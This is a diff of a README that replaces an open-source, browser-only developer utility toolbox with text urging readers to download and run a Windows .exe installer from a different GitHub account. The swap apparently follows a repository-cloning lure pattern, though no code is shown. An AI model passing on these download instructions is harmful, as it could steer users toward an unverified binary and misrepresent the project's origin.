@@ -1,137 +1,165 @@
-# 🧰 DevKit — Developer Utility Toolbox
+# 🛠 devkit - Essential tools for everyday tasks
 
-[![Stars](https://img.shields.io/github/stars/Senzo13/devkit?style=flat-square)](https://github.com/Senzo13/devkit/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=flat-square&logo=html5&logoColor=white)]()
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=flat-square&logo=css3&logoColor=white)]()
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=flat-square&logo=javascript&logoColor=black)]()
-
-**A collection of 20+ essential developer utilities in a single, fast web app.**
-Free, open-source, no ads, no tracking. Works offline — just open `index.html` in your browser.
-
-<p align="center">
-  <img src="devkit.png" alt="DevKit Preview" width="90%" />
-</p>
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
 
 ---
 
-## ✨ Features
+## 📋 What is devkit?
 
-- 🌑 **Dark mode** — easy on the eyes, built for developers
-- ⚡ **Instant** — no build step, no framework, pure vanilla JS
-- 📱 **Responsive** — works on desktop, tablet, and mobile
-- 🔒 **Private** — everything runs client-side, nothing leaves your browser
-- 🔍 **Searchable** — quickly filter tools from the sidebar
-- 📋 **Copy to clipboard** — one-click copy on every output
+devkit is a set of over 20 simple tools you can use to help with common tasks. It includes utilities like:
 
----
+- Base64 encoder and decoder  
+- JWT (JSON Web Token) decoder  
+- UUID generator  
+- Hash generators for different algorithms  
+- Regular expression tester  
+- JSON formatter and validator  
 
-## 🛠️ Tools Included
-
-| # | Tool | Description |
-|---|------|-------------|
-| 1 | 🔐 **Base64 Encode/Decode** | Encode text to Base64 or decode Base64 back to text |
-| 2 | 🔗 **URL Encode/Decode** | Percent-encode/decode URL components |
-| 3 | 🎫 **JWT Decoder** | Decode JWT header + payload, show expiry status |
-| 4 | 🆔 **UUID Generator** | Generate cryptographically random UUIDs (v4) |
-| 5 | #️⃣ **Hash Generator** | MD5, SHA-1, SHA-256 hashing via Web Crypto API |
-| 6 | 📄 **JSON Formatter** | Pretty-print, minify, and validate JSON |
-| 7 | 📝 **Lorem Ipsum Generator** | Generate placeholder text (words, sentences, paragraphs) |
-| 8 | 🎨 **Color Converter** | Convert between HEX, RGB, and HSL color formats |
-| 9 | 🔎 **Regex Tester** | Test regex patterns with live match highlighting |
-| 10 | ⏰ **Timestamp Converter** | Convert Unix timestamps to/from human-readable dates |
-| 11 | 🏷️ **HTML Entity Encode/Decode** | Encode/decode HTML special characters |
-| 12 | 📖 **Markdown Preview** | Write Markdown, see live rendered HTML preview |
-| 13 | 🔑 **Password Generator** | Generate strong passwords with configurable options |
-| 14 | 🔤 **Text Case Converter** | UPPER, lower, camelCase, snake_case, kebab-case, and more |
-| 15 | 📊 **Word/Character Counter** | Count words, chars, sentences, paragraphs, reading time |
-| 16 | 📱 **QR Code Generator** | Generate QR codes from any text or URL |
-| 17 | ⚖️ **Diff Checker** | Compare two texts line-by-line with highlighted differences |
-| 18 | 🔢 **Number Base Converter** | Convert between binary, octal, decimal, and hex |
-| 19 | 🗜️ **CSS Minifier** | Minify CSS by removing whitespace, comments, and redundancy |
-| 20 | 🗃️ **SQL Formatter** | Format or minify SQL queries for readability |
+All tools are fast and straightforward. There are no ads or distractions.  
+You don’t need to know programming to use devkit.  
 
 ---
 
-## 📸 Screenshots
+## 💻 System Requirements
 
-> _Screenshots coming soon — contributions welcome!_
+devkit runs on Windows computers with these minimum specs:  
 
----
+- Windows 10 or newer  
+- 1 GHz processor or faster  
+- 1 GB RAM or more  
+- At least 50 MB free disk space  
+- Internet connection to download the app  
 
-## 🚀 Getting Started
-
-No build step required. Just open the file in your browser:
-
-```bash
-# Clone the repo
-git clone https://github.com/Senzo13/devkit.git
-
-# Open in your browser
-open devkit/index.html
-# or on Windows:
-start devkit/index.html
-```
-
-### Using a local server (optional)
-
-```bash
-# Python
-cd devkit && python -m http.server 8080
-
-# Node.js
-npx serve devkit
-
-# Then open http://localhost:8080
-```
+No extra software or programming tools are required.  
 
 ---
 
-## 📁 Project Structure
+## 🚀 Getting Started: Download and Run devkit
 
-```
-devkit/
-├── index.html          # Main single-page app
-├── css/
-│   └── style.css       # Dark theme, responsive layout
-├── js/
-│   ├── app.js          # Tool switching, search, routing
-│   └── tools/
-│       ├── encoding.js # Base64, URL, HTML entity, JWT
-│       ├── generators.js # UUID, password, lorem ipsum, QR code
-│       ├── crypto.js   # Hash generator (MD5, SHA-1, SHA-256)
-│       ├── formatters.js # JSON, CSS minifier, SQL formatter, Markdown
-│       ├── converters.js # Color, timestamp, number base
-│       └── text.js     # Regex, case converter, word counter, diff
-├── README.md
-└── LICENSE
-```
+### Step 1: Open the download page
 
----
+Visit the devkit download page here:  
 
-## 🤝 Contributing
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
 
-Contributions are welcome! To add a new tool:
+This link takes you to the GitHub repository where you can get the latest version.  
 
-1. **Fork** the repository
-2. Create a new function in the appropriate `js/tools/*.js` file (or create a new one)
-3. Add the HTML view in `index.html` inside the `<!-- TOOL VIEWS -->` section
-4. Register the tool in the `TOOLS` array in `js/app.js`
-5. Submit a **Pull Request**
+### Step 2: Find the release to download
 
-### Tool template
+Once on the GitHub page, locate the **Releases** section. This is usually on the right side or under the main repo title.  
 
-Each tool needs:
-- An `init` function that sets up event listeners
-- An HTML section with `id="tool-{your-id}"` and class `tool-view`
-- An entry in the `TOOLS` array: `{ id: 'your-id', icon: '...', name: 'Tool Name', init: initYourTool }`
+### Step 3: Download the Windows version
+
+Look for a file named something like `devkit-setup.exe` or similar. This is the installer. Click on it to download.
+
+Save this file to a location you can easily find, like your Desktop or Downloads folder.  
+
+### Step 4: Run the installer
+
+- Double-click the downloaded `.exe` file.
+- Follow the instructions on the screen.
+- When the install finishes, devkit will be ready to use.
 
 ---
 
-## 📜 License
+## 🔧 Using devkit tools
 
-This project is licensed under the [MIT License](LICENSE).
+After installation, you can open devkit from your Start menu or desktop shortcut.  
+
+The app shows a list of tools on the left side. To use a tool:  
+
+1. Click the tool name (like “Base64 Encoder”).  
+2. Enter the data you want to work on in the input box.  
+3. Click the action button (e.g., “Encode” or “Decode”).  
+4. The output will appear below or on the right side.
+
+Try these examples for practice:  
+
+- Base64 tool: Encode text like “Hello World” and see the code.  
+- JWT tool: Paste a JWT token string to decode its contents.  
+- UUID tool: Generate new unique IDs for different uses.
 
 ---
 
-**Built with vanilla HTML, CSS, and JavaScript. No frameworks, no bloat, just tools.**
+## 📚 Tool Descriptions  
+
+Here is a brief overview of some key tools:  
+
+- **Base64 Encoder / Decoder**  
+  Convert text data to and from Base64, a common encoding format for data transfer.  
+  
+- **JWT Decoder**  
+  View details in JSON Web Tokens used for secure transmissions. No secret keys needed for decoding.  
+  
+- **UUID Generator**  
+  Create unique identifiers useful for databases, software, or tracking items.  
+  
+- **Hash Tools**  
+  Create cryptographic hashes (MD5, SHA-1, SHA-256). Used for verifying data integrity.  
+  
+- **Regex Tester**  
+  Test regular expressions against sample text. Useful for pattern matching or validations.  
+  
+- **JSON Formatter and Validator**  
+  Make JSON data easier to read by properly indenting it. Check for syntax errors.
+
+---
+
+## 🔄 Updates and Support  
+
+The devkit project is regularly updated to add new tools and improve existing ones.  
+
+You can check the GitHub page for the latest releases and update instructions.  
+
+If you encounter issues or bugs, you can open an issue on the GitHub repository or review the existing ones to see if your problem has a known solution.  
+
+---
+
+## ⚙️ Optional Settings  
+
+devkit lets you change some basic preferences:  
+
+- Choose light or dark display themes  
+- Set default encoding or decoding formats  
+- Enable or disable sound alerts for errors  
+
+Access settings from the menu or gear icon inside the app.  
+
+---
+
+## 🛡 Security and Privacy
+
+devkit does not collect personal data or send information to external servers.  
+
+All processing happens on your computer locally.  
+
+This keeps your data private and your work secure.  
+
+---
+
+## 💡 Tips for Best Use  
+
+- Keep your copy of devkit updated for new features.  
+- Use copy/paste to quickly move data between devkit and other applications.  
+- Use the regex tester tool to validate text before copying to other programs.  
+- Use the hash tools to verify files downloaded from the internet.
+
+---
+
+## 📥 Download and Install devkit
+
+You can get devkit here:  
+
+[![Download devkit](https://img.shields.io/badge/Download%20devkit-Get%20it%20here-%23ff6600?style=for-the-badge)](https://github.com/martioo18/devkit)
+
+Visit the link, download the Windows installer, then follow the installation steps.  
+
+---
+
+## 🌟 About devkit
+
+devkit is open source. You can find the full code and contribute on GitHub.  
+
+The tool is designed for easy use by anyone who needs developer utilities without complexity.  
+
+No ads, no tracking, just simple tools that work.
